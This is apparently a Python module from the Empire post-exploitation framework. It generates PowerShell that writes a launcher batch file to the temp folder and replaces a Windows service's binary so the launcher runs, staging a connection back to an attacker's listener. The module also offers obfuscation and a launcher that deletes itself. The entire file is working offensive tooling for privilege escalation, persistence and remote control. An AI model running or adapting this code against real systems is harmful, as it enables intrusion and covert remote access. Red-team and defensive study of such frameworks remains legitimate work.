from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Install-ServiceBinary',

            'Author': ['@harmj0y'],

            'Description': ("Backs up a service's binary and replaces the original "
                            "with a binary that launches a stager.bat."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   "The service name to manipulate.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'Delete' : {
                'Description'   :   "Switch. Have the launcher.bat delete itself after running.",
                'Required'      :   False,
                'Value'         :   'True'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common powerup.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        serviceName = self.options['ServiceName']['Value']

        # # get just the code needed for the specified function
        # script = helpers.generate_dynamic_powershell_script(moduleCode, "Write-ServiceEXECMD")
        script = moduleCode

        # generate the .bat launcher code to write out to the specified location
        l = self.mainMenu.stagers.stagers['windows/launcher_bat']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        if self.options['Delete']['Value'].lower() == "true":
            l.options['Delete']['Value'] = "True"
        else:
            l.options['Delete']['Value'] = "False"
        launcherCode = l.generate()


        # PowerShell code to write the launcher.bat out
        scriptEnd = ";$tempLoc = \"$env:temp\\debug.bat\""
        scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
        scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"
  
        if launcherCode == "":
            print helpers.color("[!] Error in launcher .bat generation.")
            return ""
        else:
            scriptEnd += "\nInstall-ServiceBinary -ServiceName \""+str(serviceName)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""    
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
